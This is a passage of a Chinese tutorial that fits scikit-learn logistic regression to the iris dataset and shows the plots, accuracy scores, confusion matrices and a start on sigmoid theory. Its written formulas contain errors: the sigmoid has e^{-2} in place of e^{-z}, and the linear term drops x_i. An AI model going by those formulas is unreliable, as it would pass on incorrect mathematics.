0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,       1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,       1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,       2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,       2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用value_counts函数查看每个类别数量</span></span><br><span class="line">pd.Series(iris_target).value_counts()</span><br></pre></td></tr></table></figure><pre><code>0    501    502    50dtype: int64</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 对于特征进行一些统计描述</span></span><br><span class="line">iris_features.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>sepal length (cm)</th>      <th>sepal width (cm)</th>      <th>petal length (cm)</th>      <th>petal width (cm)</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>150.000000</td>      <td>150.000000</td>      <td>150.000000</td>      <td>150.000000</td>    </tr>    <tr>      <th>mean</th>      <td>5.843333</td>      <td>3.057333</td>      <td>3.758000</td>      <td>1.199333</td>    </tr>    <tr>      <th>std</th>      <td>0.828066</td>      <td>0.435866</td>      <td>1.765298</td>      <td>0.762238</td>    </tr>    <tr>      <th>min</th>      <td>4.300000</td>      <td>2.000000</td>      <td>1.000000</td>      <td>0.100000</td>    </tr>    <tr>      <th>25%</th>      <td>5.100000</td>      <td>2.800000</td>      <td>1.600000</td>      <td>0.300000</td>    </tr>    <tr>      <th>50%</th>      <td>5.800000</td>      <td>3.000000</td>      <td>4.350000</td>      <td>1.300000</td>    </tr>    <tr>      <th>75%</th>      <td>6.400000</td>      <td>3.300000</td>      <td>5.100000</td>      <td>1.800000</td>    </tr>    <tr>      <th>max</th>      <td>7.900000</td>      <td>4.400000</td>      <td>6.900000</td>      <td>2.500000</td>    </tr>  </tbody></table></div><p>从统计描述中我们可以看到不同数值特征的变化范围。</p><p><strong>Step4: 可视化描述</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 合并标签和特征信息</span></span><br><span class="line">iris_all = iris_features.copy() <span class="comment">##进行浅拷贝，防止对于原始数据的修改</span></span><br><span class="line">iris_all[<span class="string">&#x27;target&#x27;</span>] = iris_target</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 特征与标签组合的散点可视化</span></span><br><span class="line">sns.pairplot(data=iris_all,diag_kind=<span class="string">&#x27;hist&#x27;</span>, hue= <span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_26_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>从上图可以发现，在 2D 情况下不同的特征组合对于不同类别的花的散点分布，以及大概的区分能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> iris_features.columns:</span><br><span class="line">    sns.boxplot(x=<span class="string">&#x27;target&#x27;</span>, y=col, saturation=<span class="number">0.5</span>,palette=<span class="string">&#x27;pastel&#x27;</span>, data=iris_all)</span><br><span class="line">    plt.title(col)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_28_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_28_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_28_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_28_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选取其前三个特征绘制三维散点图</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax = fig.add_subplot(<span class="number">111</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">iris_all_class0 = iris_all[iris_all[<span class="string">&#x27;target&#x27;</span>]==<span class="number">0</span>].values</span><br><span class="line">iris_all_class1 = iris_all[iris_all[<span class="string">&#x27;target&#x27;</span>]==<span class="number">1</span>].values</span><br><span class="line">iris_all_class2 = iris_all[iris_all[<span class="string">&#x27;target&#x27;</span>]==<span class="number">2</span>].values</span><br><span class="line"><span class="comment"># &#x27;setosa&#x27;(0), &#x27;versicolor&#x27;(1), &#x27;virginica&#x27;(2)</span></span><br><span class="line">ax.scatter(iris_all_class0[:,<span class="number">0</span>], iris_all_class0[:,<span class="number">1</span>], iris_all_class0[:,<span class="number">2</span>],label=<span class="string">&#x27;setosa&#x27;</span>)</span><br><span class="line">ax.scatter(iris_all_class1[:,<span class="number">0</span>], iris_all_class1[:,<span class="number">1</span>], iris_all_class1[:,<span class="number">2</span>],label=<span class="string">&#x27;versicolor&#x27;</span>)</span><br><span class="line">ax.scatter(iris_all_class2[:,<span class="number">0</span>], iris_all_class2[:,<span class="number">1</span>], iris_all_class2[:,<span class="number">2</span>],label=<span class="string">&#x27;virginica&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_30_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><strong>Step5: 利用 逻辑回归模型 在二分类上 进行训练和预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，在测试集上验证模型性能。</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">## 选择其类别为0和1的样本 （不包括类别为2的样本）</span></span><br><span class="line">iris_features_part = iris_features.iloc[:<span class="number">100</span>]</span><br><span class="line">iris_target_part = iris_target[:<span class="number">100</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(iris_features_part, </span><br><span class="line">                 iris_target_part, </span><br><span class="line">                 test_size = <span class="number">0.2</span>, </span><br><span class="line">                 random_state = <span class="number">2020</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 从sklearn中导入逻辑回归模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 定义 逻辑回归模型 </span></span><br><span class="line">clf = LogisticRegression(random_state=<span class="number">0</span>, solver=<span class="string">&#x27;lbfgs&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在训练集上训练逻辑回归模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>LogisticRegression(random_state=0)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看其对应的w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the weight of Logistic Regression:&#x27;</span>,clf.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看其对应的w0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the intercept(w0) of Logistic Regression:&#x27;</span>,clf.intercept_)</span><br></pre></td></tr></table></figure><pre><code>the weight of Logistic Regression: [[ 0.45181973 -0.81743611  2.14470304  0.89838607]]the intercept(w0) of Logistic Regression: [-6.53367714]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The accuracy of the Logistic Regression is: 1.0The accuracy of the Logistic Regression is: 1.0The confusion matrix result: [[ 9  0] [ 0 11]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_38_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们可以发现其准确度为 1，代表所有的样本都预测正确了。</p><p><strong>Step6: 利用 逻辑回归模型 在三分类 (多分类) 上 进行训练和预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(iris_features, </span><br><span class="line">                                                    iris_target, test_size = <span class="number">0.2</span>, </span><br><span class="line">                                                    random_state = <span class="number">2020</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 定义 逻辑回归模型 </span></span><br><span class="line">clf = LogisticRegression(random_state=<span class="number">0</span>, solver=<span class="string">&#x27;lbfgs&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在训练集上训练逻辑回归模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>LogisticRegression(random_state=0)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看其对应的w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the weight of Logistic Regression:\n&#x27;</span>,clf.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看其对应的w0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the intercept(w0) of Logistic Regression:\n&#x27;</span>,clf.intercept_)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 由于这个是3分类，所有我们这里得到了三个逻辑回归模型的参数，其三个逻辑回归组合起来即可实现三分类。</span></span><br></pre></td></tr></table></figure><pre><code>the weight of Logistic Regression: [[-0.45928925  0.83069887 -2.26606531 -0.99743981] [ 0.33117319 -0.72863424 -0.06841147 -0.9871103 ] [ 0.12811606 -0.10206464  2.33447678  1.98455011]]the intercept(w0) of Logistic Regression: [  9.4388067    3.93047364 -13.36928034]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 由于逻辑回归模型是概率预测模型（前文介绍的 p = p(y=1|x,\theta)）,所有我们可以利用 predict_proba 函数预测其概率</span></span><br><span class="line">train_predict_proba = clf.predict_proba(x_train)</span><br><span class="line">test_predict_proba = clf.predict_proba(x_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The test predict Probability of each class:\n&#x27;</span>,test_predict_proba)</span><br><span class="line"><span class="comment">## 其中第一列代表预测为0类的概率，第二列代表预测为1类的概率，第三列代表预测为2类的概率。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br></pre></td></tr></table></figure><pre><code>The test predict Probability of each class: [[1.03461737e-05 2.33279477e-02 9.76661706e-01] [9.69926591e-01 3.00732874e-02 1.21677000e-07] [2.09992549e-02 8.69156616e-01 1.09844129e-01] [3.61934872e-03 7.91979966e-01 2.04400686e-01] [7.90943209e-03 8.00605299e-01 1.91485269e-01] [7.30034956e-04 6.60508053e-01 3.38761912e-01] [1.68614211e-04 1.86322045e-01 8.13509341e-01] [1.06915331e-01 8.90815532e-01 2.26913671e-03] [9.46928071e-01 5.30707288e-02 1.20016060e-06] [9.62346385e-01 3.76532228e-02 3.91897297e-07] [1.19533386e-04 1.38823469e-01 8.61056998e-01] [8.78881880e-03 6.97207359e-01 2.94003822e-01] [9.73938143e-01 2.60617342e-02 1.22613839e-07] [1.78434056e-03 4.79518177e-01 5.18697483e-01] [5.56924345e-04 2.46776840e-01 7.52666235e-01] [9.83549842e-01 1.64500666e-02 9.13617272e-08] [1.65201476e-02 9.54672748e-01 2.88071041e-02] [8.99853722e-03 7.82707575e-01 2.08293888e-01] [2.98015029e-05 5.45900069e-02 9.45380192e-01] [9.35695863e-01 6.43039522e-02 1.85301368e-07] [9.80621190e-01 1.93787398e-02 7.00125265e-08] [1.68478817e-04 3.30167227e-01 6.69664294e-01] [3.54046168e-03 4.02267804e-01 5.94191734e-01] [9.70617284e-01 2.93824735e-02 2.42443971e-07] [2.56895209e-04 1.54631583e-01 8.45111521e-01] [3.48668493e-02 9.11966140e-01 5.31670110e-02] [1.47218849e-02 6.84038113e-01 3.01240002e-01] [9.46510460e-04 4.28641987e-01 5.70411502e-01] [9.64848137e-01 3.51516747e-02 1.87917886e-07] [9.70436779e-01 2.95624021e-02 8.18591621e-07]]The accuracy of the Logistic Regression is: 0.9833333333333333The accuracy of the Logistic Regression is: 0.8666666666666667</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看混淆矩阵</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The confusion matrix result: [[10  0  0] [ 0  8  2] [ 0  2  8]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_45_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><h2 id="重要知识点"><a class="markdownIt-Anchor" href="#重要知识点">#</a> 重要知识点</h2><p>逻辑回归 原理简介：</p><p>Logistic 回归虽然名字里带 “回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别），所以利用了 Logistic 函数（或称为 Sigmoid 函数），函数形式为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>2</mn></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">log(z) = \frac {1}{1+e^{-2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.09077em;vertical-align:-0.7693300000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>其对应的函数图像可以表示如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.arange(-<span class="number">5</span>,<span class="number">5</span>,<span class="number">0.01</span>)</span><br><span class="line">y = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-x))</span><br><span class="line"></span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.grid()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_47_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p x_i="">通过上图我们可以发现 Logistic 函数是单调递增函数，并且在 z=0 的时候取值为 0.5，并且 logi (⋅) 函数的取值范围为 (0,1)。<br>而回归的基本方程为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><msub><mi>w</mi><mn>0</mn></msub><mo>+</mo><msubsup><mo>∑</mo><mi>i</mi><mi>N</mi></msubsup><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">z=w_0+\sum_{i}^N{w_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2809409999999999em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>将回归方程写入其中为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mo stretchy="false">(</mo><msub><mi>w</mi><mn>0</mn></msub><mo>+</mo><munderover><mo>∑</mo><mi>i</mi><mi>N</mi></munderover><mrow><msub><mi>w</mi><mi>i</mi></msub><msub><mi>x</mi><mi>i</mi></msub></mrow><mo stretchy="false">)</mo></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">p=p(y=1|x,\theta)=h_\theta(x,\theta)=\frac{1}{1+e^{-(w_0+\sum_i^N{w_ix_i})}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span 